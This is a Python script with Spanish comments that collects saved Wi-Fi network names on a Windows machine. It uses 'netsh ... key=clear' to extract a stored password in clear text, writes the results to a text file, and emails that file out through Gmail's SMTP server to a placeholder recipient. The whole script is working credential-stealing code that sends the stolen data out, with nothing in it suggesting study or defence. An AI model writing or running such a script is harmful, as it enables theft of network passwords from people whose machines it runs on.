import subprocess
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication

# Ejecutar el comando 'netsh wlan show profiles' y obtener la salida
output_profiles = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles'], universal_newlines=True)

# Dividir la salida en líneas
profiles = output_profiles.split('\n')

# Inicializar una lista para almacenar los nombres de red
network_names = []

# Recorrer las líneas y buscar los nombres de red
for line in profiles:
    if "Perfil de todos los usuarios" in line:
        # Extraer el nombre de red de la línea
        network_name = line.split(":")[1].strip()
        network_names.append(network_name)

# Crear un archivo de texto para guardar la información
with open('redes_wifi.txt', 'w') as file:
    file.write("Nombres de Red:\n")
    for name in network_names:
        file.write(name + '\n')

# Ahora puedes seleccionar un nombre de red específico para mostrar su clave (key) si lo deseas
output_key = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', f'name="{name}"', 'key=clear'], universal_newlines=True)

# Adjuntar la información de las contraseñas al archivo de texto
with open('redes_wifi.txt', 'a') as file:
    file.write("\nContraseñas de Red:\n")
    file.write(output_key)

# Enviar el archivo por correo electrónico
email_address = 'tucorreo@gmail.com'  # Cambia esto a tu dirección de correo
password = 'tucontraseña'  # Cambia esto a tu contraseña
recipient_email = 'correodestino@gmail.com'  # Cambia esto al correo del destinatario

# Configurar el servidor SMTP de Gmail
smtp_server = 'smtp.gmail.com'
smtp_port = 587

# Iniciar sesión en el servidor SMTP
server = smtplib.SMTP(smtp_server, smtp_port)
server.starttls()
server.login(email_address, password)

# Crear el mensaje de correo
message = MIMEMultipart()
message['From'] = email_address
message['To'] = recipient_email
message['Subject'] = 'Información de redes Wi-Fi'

# Adjuntar el archivo de texto al mensaje
with open('redes_wifi.txt', 'rb') as attachment:
    part = MIMEApplication(attachment.read(), Name='redes_wifi.txt')
    part['Content-Disposition'] = f'attachment; filename={"redes_wifi.txt"}'
    message.attach(part)

# Enviar el mensaje
server.sendmail(email_address, recipient_email, message.as_string())

# Cerrar la conexión con el servidor SMTP
server.quit()
